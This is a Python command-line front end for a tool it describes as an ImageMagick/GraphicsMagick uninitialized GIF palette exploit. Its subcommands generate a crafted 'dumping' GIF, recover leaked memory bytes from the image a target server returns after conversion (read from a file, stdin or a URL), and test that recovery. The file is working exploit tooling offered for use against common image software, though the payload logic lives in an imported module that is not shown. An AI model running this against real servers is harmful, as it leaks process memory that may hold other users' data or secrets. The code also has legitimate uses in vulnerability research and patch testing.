import argparse
import os
import sys

import requests

from .api import gen_dumping_gif
from .api import gen_random_palette
from .api import gen_testing_text_palette
from .api import load_picture
from .api import recover
from .api import test_recover

BIN_STDIN = sys.stdin.buffer
BIN_STDOUT = sys.stdout.buffer


def color_count(s):
    c = int(s)
    if not 0 < c <= 256:
        raise ValueError("color count must be between 1 and 256")
    return c


def geometry(geometry):
    try:
        w, h = map(int, geometry.split("x"))
    except Exception:
        raise ValueError("Wrong geometry format: {}".format(geometry))
    return (w, h)


def run():
    parser = argparse.ArgumentParser(description="ImageMagick/GraphicsMagick uninitialized gif palette exploit")
    parser.add_argument("--tool", choices=["GM", "IM"], default="IM", help="tool for internal conversion operations (default: IM)")

    subparsers = parser.add_subparsers(dest="cmd")
    subparsers.required = True
    gen_parser = subparsers.add_parser("gen", help="generate dumping gif")
    gen_parser.add_argument("--animate", help="try to generate fake animation", action="store_true")
    gen_parser.add_argument("geometry", help="geometry of the picture (WxH), must match converted picture geometry", type=geometry)
    gen_parser.add_argument("output_filename", help="where to save the result ('-' for stdout)", default="-", nargs="?")
    gen_parser.add_argument("--colors", type=color_count, help="dump less than 256 colors (will dump COLORS*3 bytes)", default=256)

    recover_parser = subparsers.add_parser("recover", help="recover memory from converted image")
    recover_parser.add_argument(
        "input_filename",
        help="input file (path or url, '-' for stdin). geometry must match the original gif (generated via \"gen\" command). jpeg works very bad",
    )
    recover_parser.add_argument("output_filename", default="-", help="where to save the result", nargs="?")
    recover_parser.add_argument(
        "--colors", type=color_count, help='recover less than 256 colors (must be the value used when running "gen")', default=256
    )

    recover_test = subparsers.add_parser("recover_test", help="test recovery")
    recover_test.add_argument("geometry", help="geometry of the picture (WxH)", type=geometry)
    recover_test.add_argument("--format", help="format to test", default="png")
    recover_test.add_argument(
        "--randomize", help='emulate random memory contents (default: use "Lorem ipsum" as memory contents)', action="store_true"
    )
    recover_test.add_argument("--save-pict", help="save the picture")
    recover_test.add_argument("--quality", help="pass '--quality' to GM/IM call", default=None)
    recover_test.add_argument("--colors", type=color_count, help="dump less than 256 colors (will dump COLORS*3 bytes)", default=256)

    args = parser.parse_args()

    if args.cmd == "gen":
        w, h = args.geometry
        gif = gen_dumping_gif(w, h, tool=args.tool, animate=args.animate, colors=args.colors)
        if args.output_filename == "-":
            BIN_STDOUT.write(gif)
        else:
            with open(args.output_filename, "wb") as f:
                f.write(gif)

    elif args.cmd == "recover":
        if args.input_filename == "-":
            pict_data = BIN_STDIN.read()
        else:
            if os.path.isfile(args.input_filename):
                with open(args.input_filename, "rb") as f:
                    pict_data = f.read()
            elif args.input_filename.lower().startswith("http"):
                # Must be a url
                r = requests.get(args.input_filename)
                pict_data = r.content
            else:
                print("Can't understand `input_filename`: {}".format(args.input_filename))
                sys.exit(-1)

        palette = recover(load_picture(pict_data, tool=args.tool), colors=args.colors)
        palette_bytes = bytes(bytearray().join(map(bytearray, palette)))

        if args.output_filename == "-":
            BIN_STDOUT.write(palette_bytes)
        else:
            with open(args.output_filename, "wb") as f:
                f.write(palette_bytes)

    elif args.cmd == "recover_test":
        w, h = args.geometry
        if args.randomize:
            palette = gen_random_palette()
        else:
            palette = gen_testing_text_palette()
        test_recover(args.format, palette, w, h, quality=args.quality, tool=args.tool, save_pict=args.save_pict, colors=args.colors)


if __name__ == "__main__":
    run()
